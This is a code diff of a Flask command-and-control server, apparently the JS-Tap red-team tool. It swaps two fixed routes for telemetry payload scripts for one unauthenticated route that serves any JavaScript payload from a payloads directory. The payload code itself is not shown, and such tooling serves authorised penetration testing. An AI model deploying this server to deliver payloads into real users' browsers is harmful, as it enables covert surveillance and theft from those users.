@@ -627,25 +627,19 @@ def afterRequestHeaders(response):
 
 # Page Endpoints
 
-# Send a copy of the payload
-@app.route('/lib/telemlib.js', methods=['GET'])
-def sendPayload():
-    with open('./telemlib.js', 'rb') as file:
-        payload = file.read()
-        response = make_response(payload, 200)
-        response.mimetype = 'text/javascript'
 
-        return response
+# Serve up a whole directory just for different configurations 
+# of JS-Tap payloads. No authentication required to pull these in
+# Have different ones/configurations for different applications
+# Put your payloads in thte ./payloads directory. 
+@app.route('/lib/<path:filename>')
+def servePayloads(filename):
+    response = send_from_directory('./payloads', filename)
 
-# Send a copy of the payload
-@app.route('/lib/telemlib-v2.js', methods=['GET'])
-def sendPayload2():
-    with open('./telemlib-v2.js', 'rb') as file:
-        payload = file.read()
-        response = make_response(payload, 200)
-        response.mimetype = 'text/javascript'
+    response.headers['Content-Type'] = 'text/javascript'
 
-        return response
+    return response
+
 
 
 # Send c2 UI index page
